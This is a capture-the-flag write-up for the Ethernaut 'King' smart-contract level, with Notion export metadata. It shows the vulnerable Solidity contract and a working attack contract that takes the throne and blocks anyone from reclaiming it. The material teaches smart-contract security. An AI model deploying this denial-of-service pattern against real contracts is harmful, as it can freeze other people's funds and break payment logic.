---
title: "King"
date: "2024-02-02"
lastmod: "2024-02-12T13:54:00.000Z"
draft: false
difficulty: "⭐⭐⭐"
weight: 9
state: "Terminé"
level-url: "https://ethernaut.openzeppelin.com/level/9"
type: "docs"
NOTION_METADATA:
  object: "page"
  id: "8338a297-a2b4-47b3-b401-66c68586199d"
  created_time: "2024-02-12T13:39:00.000Z"
  last_edited_time: "2024-02-12T13:54:00.000Z"
  created_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  last_edited_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  cover: null
  icon:
    type: "external"
    external:
      url: "https://ethernaut.openzeppelin.com/imgs/BigLevel9.svg"
  parent:
    type: "database_id"
    database_id: "cb6853ff-d731-4d6a-9080-6c8efeec5b1c"
  archived: false
  properties:
    difficulty:
      id: "IAjo"
      type: "select"
      select:
        id: "aa1cb61f-428e-4dc4-abad-06b3092cb0ce"
        name: "⭐⭐⭐"
        color: "green"
    prev:
      id: "LLP%5C"
      type: "rich_text"
      rich_text: []
    date:
      id: "Y%40Gy"
      type: "date"
      date:
        start: "2024-02-02"
        end: null
        time_zone: null
    weight:
      id: "%5Dyda"
      type: "number"
      number: 9
    state:
      id: "f%40ps"
      type: "status"
      status:
        id: "abb7fad3-add1-4b13-946c-06bff36598bf"
        name: "Terminé"
        color: "green"
    level-url:
      id: "juZs"
      type: "url"
      url: "https://ethernaut.openzeppelin.com/level/9"
    next:
      id: "pocA"
      type: "rich_text"
      rich_text: []
    type:
      id: "s%7DKc"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "docs"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "docs"
          href: null
    title:
      id: "title"
      type: "title"
      title:
        - type: "text"
          text:
            content: "King"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "King"
          href: null
  url: "https://www.notion.so/King-8338a297a2b447b3b40166c68586199d"
  public_url: null
UPDATE_TIME: "2024-02-12T14:32:20.472Z"

---
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">


The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD


Such a fun game. Your goal is to break it.


When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
```


> 💡 Most of Ethernaut's levels try to expose (in an oversimplified form of   
> course) something that actually happened — a real hack or a real bug.  
> In this case, see: [King of the Ether](https://www.kingoftheether.com/thrones/kingoftheether/index.html) and [King of the Ether Postmortem](http://www.kingoftheether.com/postmortem.html).


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface King {
  function prize() external returns(uint);
  function owner() external returns(address);
  receive() external payable;
  function _king() external view returns (address);
}

contract TheOnlyOneKing {
  King fakeKing;

  constructor(address payable _fakeKing) {
    fakeKing = King(_fakeKing);
  }

  function becomeTheOnlyOneKing() public payable {
    uint prize = fakeKing.prize();
    (bool success,) = address(fakeKing).call{value: prize}("");
    require(success, 'failed become the only one king');
  }

  receive() external payable {
    if (fakeKing._king() != address(this)) {
      payable(fakeKing).transfer(msg.value);
    }
  }
}
```


This solution is overkill since we can just forbid the to send ether to a contract just by not implementing any fallback function. But this solution is more fun since it’s like TheOnlyOneKing is always fighting back for his crown ! 👑

